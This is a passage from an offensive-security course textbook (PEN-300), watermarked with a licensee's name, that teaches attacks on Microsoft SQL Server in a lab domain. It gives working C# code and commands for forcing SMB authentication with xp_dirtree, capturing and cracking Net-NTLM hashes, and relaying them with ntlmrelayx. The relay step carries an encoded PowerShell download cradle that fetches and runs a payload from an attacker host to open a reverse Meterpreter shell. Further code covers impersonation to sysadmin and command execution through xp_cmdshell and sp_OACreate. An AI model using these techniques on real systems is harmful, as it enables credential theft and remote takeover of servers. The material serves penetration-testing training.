UNC Path Injection 
In this section, we are going to examine an attack that can quickly lead to code execution on other 
SQL servers present in the environment. 
The premise of the attack is rather simple. If we can force an SQL server to connect to an SMB 
share we control, the connection will include authentication data. More specifically, NTLM 
authentication will take place and we should be able to capture the hash of the user account 
under whose context the SQL server is running. We can then either try to crack the hash or use it 
in relaying attacks. 
This attack consists of a number of steps. We will cover each of these while also discussing the 
required theory. 
We are going to start by forcing the SQL server to perform a connection request to a SMB share 
on our Kali machine. To do that, we can use the undocumented xp_dirtree900 SQL procedure, 
which lists all files in a given folder. More importantly, the procedure can accept a SMB share as a 
target, rather than just local file paths. 
If we use our unprivileged access in the database to execute the xp_dirtree procedure, the service 
account of the SQL server will attempt to list the contents of a given SMB share. A SMB share is 
typically supplied with a Universal Naming Convention (UNC)901 path, which has the following 
format. 
 
900 (Sql Server Central, 2012), https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder 
901 (Wikipedia, 2020),https://en.wikipedia.org/wiki/Path_(computing)#UNC 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
581 
\\hostname\folder\file 
Listing 735 - UNC path format 
If the hostname is given as an IP address, Windows will automatically revert to NTLM 
authentication instead of Kerberos authentication.902 
We are now ready to create a C# console app that performs authentication to the SQL server on 
dc01 with the unprivileged login and then issues a SQL query that executes the xp_dirtree 
procedure. 
The authentication portion of the code is the same as in our previous proof of concept. We’ll use 
the ExecuteReader method again and pass the query to the SQL server. 
using System; 
using System.Data.SqlClient; 
 
namespace SQL 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            String sqlServer = "dc01.corp1.com"; 
            String database = "master"; 
 
            String conString = "Server = " + sqlServer + "; Database = " + database + 
"; Integrated Security = True;"; 
            SqlConnection con = new SqlConnection(conString); 
            
            try 
            { 
                con.Open(); 
                Console.WriteLine("Auth success!"); 
            } 
            catch 
            { 
                Console.WriteLine("Auth failed"); 
                Environment.Exit(0); 
            } 
 
            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";"; 
            SqlCommand command = new SqlCommand(query, con); 
            SqlDataReader reader = command.ExecuteReader(); 
            reader.Close(); 
             
            con.Close(); 
        } 
    } 
} 
Listing 736 - C# code to execute xp_dirtree procedure 
 
902 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-server/security/kerberos/configuring-kerberos-over-ip 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
582 
The SQL query to invoke xp_dirtree contains a number of backslashes, both to escape the double 
quote required by the SQL query and to escape the backslashes in the UNC path as required by 
C# strings. 
Many other SQL procedures can be used to initiate the connection if xp_dirtree 
has been removed for security reasons.903 
Now we must set up a SMB share that will initiate NTLM authentication when the SQL service 
account performs the connection. An easy way to do this is by using Responder,904 which comes 
pre-installed on Kali. 
We’ll need to shut down the Samba share used with Visual Studio before starting Responder. 
Once that is done, we can launch responder and specify the VPN connection network interface 
(-I). 
kali@kali:~$ sudo responder -I tap0 
                                          
... 
 
[+] Poisoners: 
    LLMNR                      [ON] 
    NBT-NS                     [ON] 
    DNS/MDNS                   [ON] 
 
[+] Servers: 
    HTTP server                [ON] 
    HTTPS server               [ON] 
    WPAD proxy                 [OFF] 
    Auth proxy                 [OFF] 
    SMB server                 [ON] 
    Kerberos server            [ON] 
... 
 
[+] Listening for events... 
Listing 737 - Running Responder with default options 
With Responder running, we are ready to start the attack. 
We run the C# console application from the Windows 10 client, which initiates the SMB 
connection against our Kali machine. Within moments, we obtain the output displayed in Listing 
738. 
[SMB] NTLMv2-SSP Client   : 192.168.120.5 
[SMB] NTLMv2-SSP Username : corp1\SQLSvc 
[SMB] NTLMv2-SSP Hash     : 
SQLSvc::corp1:00031db3ed40602b:A05501E7450025CF27120CE89BAF1C6E:0101000000000000C06531
50DE09D201F361A5C346497213000000000200080053004D004200330001001E00570049004E002D005000
 
903 (NetSPI, 2020), https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet 
904 (Ignadx, 2020), https://github.com/lgandx/Responder 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
583 
52004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C
0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D004200
33002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0
653150DE09D20106000400020000000800300030000000000000000000000000300000F0C0485B788E5056
8F693E83CCD6953981AFB24CAFC525AC27F6B099E5685FA20A001000000000000000000000000000000000
000900240063006900660073002F003100390032002E003100360038002E003100310038002E0039000000
00000000000000000000                                          
[*] Skipping previously captured hash for corp1\SQLSvc 
Listing 738 - Obtaining Net-NTLM hash from dc01 
The hash obtained by Responder is called a Net-NTLM905 hash or sometimes NTLMv2. Before we 
continue, let’s quickly review the difference between NTLM and Net-NTLM. 
As covered in a previous module, Windows user account passwords are stored locally as NTLM 
hashes. When authentication with the NTLM protocol takes place over the network, a challenge 
and response is created based on the NTLM hash. The resulting hash is called Net-NTLM and it 
represents the same clear text password as the NTLM hash. 
A Net-NTLM hash based on a weak password can be cracked and reveal the clear text password, 
just like with a NTLM hash. 
In this example, we attempt to crack the hash with hashcat906 by copying the hash into a file 
(hash.txt). We then specify the Net-NTLM hash type with the -m option along with a dictionary file. 
kali@kali:~$ hashcat -m 5600 hash.txt dict.txt --force 
hashcat (v5.1.0) starting... 
... 
 
SQLSVC::corp1:00031db3ed40602b:a05501e7450025cf27120ce89baf1c6e:0101000000000000c06531
50de09d201f361a5c346497213000000000200080053004d004200330001001e00570049004e002d005000
52004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c
0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d004200
33002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0
653150de09d20106000400020000000800300030000000000000000000000000300000f0c0485b788e5056
8f693e83ccd6953981afb24cafc525ac27f6b099e5685fa20a001000000000000000000000000000000000
000900240063006900660073002f003100390032002e003100360038002e003100310038002e0039000000
00000000000000000000:lab 
                                                  
Session..........: hashcat 
Status...........: Cracked 
Hash.Type........: NetNTLMv2 
Hash.Target......: SQLSVC::corp1:00031db3ed40602b:a05501e7450025cf2712...000000 
... 
Listing 739 - Cracking the Net-NTLM hash with Hashcat 
This reveals the password “lab” for the SQLSVC service account. Since SQLSVC is a local 
administrator on both dc01 and appsrv01, we now have access to both of them. 
 
905 (Peter Gombos, 2018), https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4 
906 (HashCat), https://hashcat.net/hashcat/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
584 
 
Hashcat is meant to be run on a physical machine to take advantage of powerful 
GPUs. In the example above, we had to supply the –force flag because we ran it 
inside a VM and no physical hardware was detected by Hashcat. It’s also 
possible to use John the Ripper907 to crack the hash instead. 
If weak passwords are used for SQL service accounts, this can be a quick way to compromise the 
operating system. In the next section, we are going to examine a variant of this attack that will not 
require the Net-NTLM hash to be cracked. 
15.1.3.1 Exercises 
1. 
Create the C# code that will trigger a connection to a SMB share. 
2. 
Capture the Net-NTLM hash with Responder. 
3. 
Crack the password hash for SQLSVC and gain access to appsrv01 and dc01. 
15.1.4 
Relay My Hash 
In the previous section, we forced the SQL service account to connect to our SMB share and 
capture the Net-NTLM hash. We were lucky that the service account used a weak password, 
which allows us to crack it. 
Now we are going to discuss a technique that will yield code execution on the operating system 
of the SQL server without requiring us to crack the hash. 
If we have captured the NTLM hash of a domain user that is a local administrator on a remote 
machine, we can perform a pass-the-hash attack and gain remote code execution. 
However, the Net-NTLM hash cannot be used in a pass-the-hash attack, but we can relay it to a 
different computer. If the user is a local administrator on the target, we can obtain code 
execution. 
It’s not possible to relay a Net-NTLM hash back to the origin computer using the 
same protocol as this was blocked by Microsoft in 2008. 
It is important to note that Net-NTLM relaying against SMB is only possible if SMB signing908 is 
not enabled. SMB signing is only enabled by default on domain controllers. 
 
907 (Openwall, 2020), https://www.openwall.com/john/ 
908 (Microsoft, 2010), https://docs.microsoft.com/en-gb/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-
smb2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
585 
In our enumeration exercise, we found that the service account used with the SQL server is used 
on both dc01 and appsrv01 and that it’s a local administrator on both systems. This means we 
can relay the Net-NTLM hash from dc01 to appsrv01. 
To perform this attack, we are going to use the Impacket909 ntlmrelayx tool. This tool forces the 
same type of NTLM authentication as Responder, but relays the authentication to a different host 
and allows us to execute arbitrary commands against it. 
To install Impacket, we will use the python3-impacket package in Kali. 
kali@kali:~$ sudo apt install python3-impacket 
[sudo] password for kali:  
Reading package lists... Done 
Building dependency tree        
Reading state information... Done 
... 
Listing 740 - Installing Impacket 
With Impacket installed, we can continue with the attack. 
We are going to use our previously-developed PowerShell runner to execute a Meterpreter staged 
payload. We’ll generate a staged Meterpreter payload that connects back on TCP port 443 and 
embed that in our runner (run.txt), which we can host with Apache on TCP port 80.  
When we invoke ntlmrelayx, we must supply the PowerShell download cradle on the command 
line. Because of the syntax, it is a good idea to base64 encode it. To do this on Kali, we can 
quickly install PowerShell as shown in Listing 741. 
kali@kali:~$ sudo apt -y install powershell 
[sudo] password for kali:  
Reading package lists... Done 
Building dependency tree        
Reading state information... Done 
... 
Listing 741 - Installing PowerShell in Kali 
Next, we start PowerShell with the pwsh command and base64 encode the download cradle. 
kali@kali:~$ pwsh 
PowerShell 7.0.0 
Copyright (c) Microsoft Corporation. All rights reserved. 
 
https://aka.ms/powershell 
Type 'help' to get help. 
 
PS /home/kali> $text = "(New-Object 
System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX" 
PS /home/kali> $bytes = [System.Text.Encoding]::Unicode.GetBytes($text) 
PS /home/kali> $EncodedText = [Convert]::ToBase64String($bytes) 
PS /home/kali> $EncodedText 
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
 
909 (Impacket, 2020), https://github.com/SecureAuthCorp/impacket 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
586 
ADEAMQA4AC4ANgAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA== 
PS /home/kali> 
Listing 742 - Base64 encoding the PowerShell download cradle 
We must also start a Metasploit multi/handler to catch the reverse Meterpreter shell on our Kali 
machine. Once all of these pieces have been prepared, we can initiate the attack. 
We launch impacket-ntlmrelayx and prevent it from setting up an HTTP web server with the –
no-http-server flag. ntlmrelayx uses SMB version 1 by default, which is disabled on Windows 
Server 2019, so we must specify the -smb2support flag to force authentication as SMB version 
2. 
Next, we supply the IP address of appsrv01 with the -t option and the command to execute with 
-c. 
kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -
c 'powershell -enc 
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AC
kALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAu
ADEAMQA4AC4AOQA6ADgAMQAvAHIAdQBuAC4AcABzADEAJwApACAAfAAgAEkARQBYAA==' 
[sudo] password for kali:  
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation 
 
[*] Protocol Client SMTP loaded.. 
[*] Protocol Client LDAPS loaded.. 
[*] Protocol Client LDAP loaded.. 
[*] Protocol Client IMAP loaded.. 
[*] Protocol Client IMAPS loaded.. 
[*] Protocol Client MSSQL loaded.. 
[*] Protocol Client SMB loaded.. 
[*] Protocol Client HTTPS loaded.. 
[*] Protocol Client HTTP loaded.. 
[*] Running in relay mode to single host 
[*] Setting up SMB Server 
 
[*] Servers started, waiting for connections 
Listing 743 - Launching ntlmrelayx 
Finally, we execute the C# console application on the Windows 10 client machine to force the 
SMB request from the SQL server. This results in NTLM authentication against our Kali machine 
and relaying of the Net-NTLM hash. 
[*] SMBD-Thread-3: Connection from CORP1/SQLSVC@192.168.120.5 controlled, attacking 
target smb://192.168.120.6 
[*] Authenticating against smb://192.168.120.6 as CORP1/SQLSVC SUCCEED 
[*] SMBD-Thread-3: Connection from CORP1/SQLSVC@192.168.120.5 controlled, but there 
are no more targets left! 
[*] SMBD-Thread-5: Connection from CORP1/SQLSVC@192.168.120.5 controlled, but there 
are no more targets left! 
... 
Listing 744 - Relaying the Net-NTLM hash with ntlmrelayx 
From the output, we notice that ntlmrelayx succeeded. If we switch to Metasploit, we notice that 
our listener has caught a reverse Meterpreter shell from appsrv01. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
587 
[*] Started HTTP reverse handler on https://192.168.119.120:443 
[*] http://192.168.119.120:443 handling request from 192.168.120.6; (UUID: pm1qmw8u) 
Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.6:49678) 
 
meterpreter >  
Listing 745 - Reverse Meterpreter shell from Net-NTLM relaying 
We have managed to get a shell on appsrv01 in the context of the SQL server service account 
without cracking the password. We were able to accomplish this despite of our low privileged 
access to the database. Excellent! 
In this section, we have covered an attack that takes advantage of shared accounts and allows us 
to compromise a number of servers on an internal network. In the next section, we are going to 
move on to ways to obtain higher privileges inside the SQL server application. 
15.1.4.1 Exercises 
1. 
Install Impacket, prepare the PowerShell shellcode runner, and Base64 encode the 
PowerShell download cradle. 
2. 
Launch ntlmrelayx to relay the Net-NTLM hash from dc01 to appsrv01 and set up a 
multi/handler in Metasploit. 
3. 
Execute the attack by triggering a connection from the SQL server to SMB on the Kali 
machine and obtain a reverse shell from appsrv01. 
15.2 MS SQL Escalation 
Although we have managed to gain access to a MS SQL server using a compromised non-
administrative domain account, our database access privileges are rather limited. In this section, 
we are going to investigate how to gain elevated privileges on the database server. 
We are also going to see how we can attempt to break out of the SQL server instance and gain 
code execution on the Windows system running the SQL server. 
15.2.1 
Privilege Escalation 
The most obvious and easy way to obtain higher privileges in the database would be to 
authenticate with a user that has sysadmin role membership. Although we might not be able to 
compromise such a user through an initial phishing attack, we could perform enumeration and 
lateral movement within Active Directory to obtain access to a user account with sysadmin role 
membership. This approach will have varying degrees of success. 
In this section, we’ll use a different approach that relies on Impersonation.910 This can be 
accomplished using the EXECUTE AS statement,911 which provides a way to execute a SQL query 
in the context of a different login or user. 
 
910 (Microsoft, 2017), https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/customizing-permissions-with-
impersonation-in-sql-server 
911 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
588 
It is important to note that only users with the explicit Impersonate permission are able to use 
impersonation. This permission is not part of the default set of permissions for most users, but 
database administrators may introduce misconfigurations that can lead to privilege escalation. 
For the purpose of this example, we have introduced an impersonation permission 
misconfiguration in the SQL server running on dc01. There are two different ways impersonation 
can be used. First, it’s possible to impersonate a different user at the login level with the EXECUTE 
AS LOGIN statement. Second, this can also be done at the user level with the EXECUTE AS USER 
statement. We will cover both scenarios. 
First, we will demonstrate impersonation at the login level. Due to our unprivileged access, we 
cannot easily enumerate which logins our current login can impersonate. However, we are able to 
enumerate which logins allow impersonation, but not who is given the permission to impersonate 
them. We can get this information using the database query shown in Listing 746. 
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals 
b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
Listing 746 - Enumerating login impersonation permissions 
This query uses information from the sys.server_permissions table,912 which contains information 
related to permissions, and the sys.server_principals table,913 which contains information about 
logins on the server. 
The WHERE clause limits results to permissions relevant to impersonation, while the FROM 
clause combines records from the sys.server_permissions table and the sys.server_principals 
table through the grantor_principal_id and principal_id fields. 
Finally, the SELECT clause returns, by name, all unique principals from the sys.server_principals 
table that match these conditions. This will give us all the logins that allow impersonation. 
We can modify our C# console application to issue this query by replacing the previous xp_dirtree 
procedure with the code shown in Listing 747. We’ll need to remember to start the Samba share 
for Visual Studio again. 
... 
              Environment.Exit(0); 
            } 
 
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER 
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE 
a.permission_name = 'IMPERSONATE';"; 
            SqlCommand command = new SqlCommand(query, con); 
            SqlDataReader reader = command.ExecuteReader(); 
 
            while(reader.Read() == true) 
            { 
              Console.WriteLine("Logins that can be impersonated: " + reader[0]); 
            } 
 
912 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-permissions-
transact-sql?view=sql-server-ver15 
913 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-
transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
589 
            reader.Close(); 
 
            con.Close(); 
        } 
... 
Listing 747 - Impersonation enumeration code in C# 
With the code updated and compiled, we execute it and discover that the sa login allows 
impersonation. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Logins that can be impersonated: sa 
Listing 748 - SA login allows impersonation 
Although we do not know who is allowed to impersonate it, at this stage we at least know that the 
sa login does allow impersonation. 
Let’s try to impersonate the sa login. In order to learn more about how this works, we update our 
C# to list the login name before and after impersonation. 
To do this, we’ll reuse the code from an earlier section where we executed the SQL “SELECT 
SYSTEM_USER” command. Listing 749 shows the code to perform the impersonation through the 
EXECUTE AS LOGIN query.  
... 
String executeas = "EXECUTE AS LOGIN = 'sa';"; 
 
command = new SqlCommand(executeas, con); 
reader = command.ExecuteReader(); 
reader.Close(); 
... 
Listing 749 - Impersonation of the SA login 
After updating and compiling the code, we can execute the application and obtain the output 
shown in Listing 750. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Before impersonation 
Executing in the context of: corp1\offsec 
After impersonation 
Executing in the context of: sa 
Listing 750 - Success in impersonating the SA login 
From Listing 750, we find that our unprivileged login can impersonate the sa login. This effectively 
gives us database server administrative privileges. 
We will explore how to use this privileged access to obtain code execution on the host operating 
system later. For now, we are going to inspect a variation of the impersonation technique. 
As we mentioned before, it’s possible to allow impersonation of a login as well as a database 
user. There are two prerequisites to this type of privilege escalation. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
590 
First, impersonation must have been granted to our user for a different user that has additional 
role memberships, preferably the sysadmin role. 
Furthermore, a database user can only perform actions on a given database. This means that 
impersonation of a user with sysadmin role membership in a database does not necessarily lead 
to server-wide sysadmin role membership. 
To fully compromise the database server, the database user we impersonate must be in a 
database that has the TRUSTWORTHY914 property set. 
The only native database with the TRUSTWORTHY property enabled is msdb. As is the case with 
many databases, the database owner (dbo) user has the sysadmin role. To illustrate the privilege 
escalation technique, the guest user has been given permissions to impersonate dbo in msdb. 
We can perform the impersonation by first switching to the msdb database and then executing 
the “EXECUTE AS USER” statement. In the code, we replace the use of “SELECT SYSTEM_USER” 
with “SELECT USER_NAME()” and change the previous “EXECUTE AS LOGIN” statement.  
... 
String executeas = "use msdb; EXECUTE AS USER = 'dbo';"; 
 
command = new SqlCommand(executeas, con); 
reader = command.ExecuteReader(); 
reader.Close(); 
... 
Listing 751 - Impersonating the dbo user 
We can modify our C# console application to perform the user impersonation and then query for 
the current user context with USER_NAME(). The results are displayed in Listing 752. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Before impersonation 
Executing in the context of: guest 
After impersonation 
Executing in the context of: dbo 
Listing 752 - Success in impersonating the dbo user 
We have successfully impersonated the dbo user and obtained sysadmin role membership. Nice! 
In this section, we covered how impersonation can be used to provide privilege escalation inside 
the SQL database if misconfigurations are present. At the end of this module, we are going to 
cover an additional way of obtaining higher privileges. 
15.2.1.1 Exercises 
1. 
Perform enumeration of login impersonation in dc01. 
2. 
Impersonate the sa login on dc01. 
3. 
Impersonate the dbo user in msdb on dc01. 
 
914 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-
server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
591 
15.2.2 
Getting Code Execution 
With sysadmin role membership, it’s possible to obtain code execution on the Windows server 
hosting the SQL database. The most well-known way of doing this is by using the xp_cmdshell915 
stored procedure. 
We are going to cover this technique, keeping in mind that because it is well known, we may find 
that xp_cmdshell is blocked or monitored. For this reason, we’ll also cover an alternative 
technique, which uses the sp_OACreate916 stored procedure. For now, let’s begin with 
xp_cmdshell. 
The xp_cmdshell stored procedure spawns a Windows command shell and passes in a string that 
is then executed. The output of the command is returned by the procedure. Since arbitrary 
command execution is dangerous, xp_cmdshell has been disabled by default since Microsoft SQL 
2005. 
Luckily, sysadmin role membership allows us to enable xp_cmdshell using advanced options and 
the sp_configure917 stored procedure. To do this, we’ll need to begin with the impersonation of the 
sa login. After this, we’ll use the sp_configure stored procedure to activate the advanced options 
and then enable xp_cmdshell. 
To activate the advanced options as well as xp_cmdshell, we must remember to update the 
currently configured values with the RECONFIGURE statement.918 
Let’s review the code for impersonating the SA login, activating the advanced options, enabling 
xp_cmdshell, and executing a whoami command. 
... 
                Environment.Exit(0); 
            } 
 
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';"; 
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"; 
            String execCmd = "EXEC xp_cmdshell whoami"; 
 
            SqlCommand command = new SqlCommand(impersonateUser, con); 
            SqlDataReader reader = command.ExecuteReader(); 
            reader.Close(); 
 
            command = new SqlCommand(enable_xpcmd, con); 
            reader = command.ExecuteReader(); 
            reader.Close(); 
 
 
915 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-
sql?view=sql-server-ver15 
916 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-
sql?view=sql-server-ver15 
917 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-
sql?view=sql-server-ver15 
918 (Microsoft, 2016), https://docs.microsoft.com/en-us/sql/t-sql/language-elements/reconfigure-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
592 
            command = new SqlCommand(execCmd, con); 
            reader = command.ExecuteReader(); 
            reader.Read(); 
            Console.WriteLine("Result of command is: " + reader[0]); 
            reader.Close(); 
 
            con.Close(); 
        } 
    } 
... 
Listing 753 - Enable and execute xp_cmdshell 
Once we update our C# console application and launch it, we should receive the results of the 
whoami command. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Result of command is: corp1\sqlsvc 
Listing 754 - Executing whoami through xp_cmdshell 
Excellent, we have proof of code execution in the context of the SQL service account! 
As mentioned in the beginning of this section, xp_cmdshell has been used by penetration testers 
and malicious actors for more than 15 years. Because it’s not a well kept secret, many 
organizations now monitor its usage or simply remove it. 
The second technique we will cover in this section uses the sp_OACreate and sp_OAMethod 
stored procedures to create and execute a new stored procedure based on Object Linking and 
Embedding (OLE).919 
With this technique, we can instantiate the Windows Script Host and use the run method just like 
we have done in previous versions of our client side code execution. 
To explain this technique in detail, we begin with sp_OACreate, which has the prototype shown in 
Listing 755. 
sp_OACreate { progid | clsid } , objecttoken OUTPUT [ , context ]  
Listing 755 - sp_OACreate prototype 
The procedure takes two arguments. The first is the OLE object that we want to instantiate 
(wscript.shell in our case), followed by the local variable where we want to store it. 
The local variable is created with the DECLARE920 statement, which accepts its name and type. In 
our case, we will call the local variable @myshell. 
Listing 756 shows the SQL statements to create the local variable and instantiate the OLE object. 
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; 
Listing 756 - Code to call sp_OACreate 
 
919 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Object_Linking_and_Embedding 
920 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/language-elements/declare-local-variable-transact-sql?view=sql-
server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
593 
Because @myshell is a local variable, we must stack the SQL queries to ensure it exists when 
sp_OACreate is invoked. 
As the next step, we execute the newly-created stored procedure with the sp_OAMethod921 
procedure, which has the method prototype shown in Listing 757. 
sp_OAMethod objecttoken , methodname   
    [ , returnvalue OUTPUT ]    
    [ , [ @parametername = ] parameter [ OUTPUT ] [ ...n ] ]    
Listing 757 - sp_OAMethod prototype 
sp_OAMethod accepts the name of the procedure to execute (@myshell), the method of the OLE 
object (run), an optional output variable, and any parameters for the invoked method. Therefore, 
we will send the command we want to execute as a parameter. 
It is not possible to obtain the results from the executed command because of 
the local scope of the @myshell variable. 
Before we can execute our new OLE-based procedure, we must ensure that the “OLE Automation 
Procedures” setting is enabled. Although it is disabled by default, we can change this setting 
using the sp_configure procedure before creating the stored procedure since we have the 
sysadmin role. 
The C# code to enable OLE objects and invoke both sp_OACreate and sp_OAMethod is included 
in Listing 758. 
... 
            Environment.Exit(0); 
        } 
 
        String impersonateUser = "EXECUTE AS LOGIN = 'sa';"; 
        String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; 
RECONFIGURE;"; 
        String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', 
@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > 
C:\\Tools\\file.txt\"';"; 
 
        SqlCommand command = new SqlCommand(impersonateUser, con); 
        SqlDataReader reader = command.ExecuteReader(); 
        reader.Close(); 
 
        command = new SqlCommand(enable_ole, con); 
        reader = command.ExecuteReader(); 
        reader.Close(); 
 
        command = new SqlCommand(execCmd, con); 
        reader = command.ExecuteReader(); 
 
921 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-
sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
594 
        reader.Close(); 
 
        con.Close(); 
    } 
} 
... 
Listing 758 - C# code to invoke sp_OACreate and sp_OAMethod 
Recall that due to the local scope of @myshell, we must use stacked queries inside the execCmd 
variable. 
With the C# console application updated, we execute it and then launch a command prompt as 
the admin domain user. Then we can verify that the C:\Tools\file.txt file was created on dc01. 
C:\Tools> type \\dc01\c$\tools\file.txt 
Test 
Listing 759 - Proof that our OLE-based procedure worked 
The contents of the file prove that our technique worked. We obtained code execution on the host 
operating system of the SQL server! 
In this section, we investigated multiple techniques for getting code execution on the SQL server 
by using stored procedures that are available by default in MS SQL. In the next section, we are 
going to expand on this by introducing a custom assembly. 
15.2.2.1 Exercises 
1. 
Use xp_cmdshell to get a reverse Meterpreter shell on dc01. 
2. 
Use sp_OACreate and sp_OAMethod to obtain a reverse Meterpreter shell on dc01. 
15.2.3 
Custom Assemblies 
In the previous section, we covered two techniques for gaining code execution from stored 
procedures. In this section, we are going to explore a different technique that also allows us to get 
arbitrary code execution, this time using managed code. 
Before we begin, let’s discuss this technique. If a database has the TRUSTWORTHY property set, 
it’s possible to use the CREATE ASSEMBLY922 statement to import a managed DLL as an object 
inside the SQL server and execute methods within it. To take advantage of this, we will need to 
perform several steps. Let’s do that one at a time. 
To begin, we will create a managed DLL by creating a new “Class Library (.NET Framework)” 
project. 
As part of the C# code, we create a method (cmdExec) that must be marked as a stored 
procedure. That statement is highlighted in the initial proof of concept code shown in Listing 760. 
using System; 
using Microsoft.SqlServer.Server; 
using System.Data.SqlTypes; 
 
922 (Microsoft, 2018), https://docs.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
